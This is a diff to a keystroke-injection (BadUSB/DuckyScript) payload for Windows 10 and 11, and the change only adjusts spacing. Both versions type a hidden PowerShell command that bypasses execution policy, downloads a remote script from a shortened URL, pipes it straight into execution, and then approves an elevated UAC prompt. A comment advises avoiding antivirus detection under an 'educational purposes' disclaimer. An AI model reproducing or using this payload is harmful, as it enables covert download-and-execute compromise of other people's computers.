@@ -5,7 +5,7 @@ REM     Target: Windows 10, 11
 GUI r
 DELAY 500
 REM Make sure your file isnt malicious and its not getting flagged by AV, this is just for educational purposes only!
-STRING powershell -w h -NoP -Ep Bypass -Command $url='File download link';$extension='exe/jpg/png/pdf/bat/ps1...';irm https://t.ly/IDPkt | iex
+STRING powershell -w h -NoP -Ep Bypass -Command $url='File download link'; $extension='exe/jpg/png/pdf/bat/ps1...'; irm https://t.ly/IDPkt | iex
 CTRL-SHIFT ENTER
 DELAY 1000
 ALT y
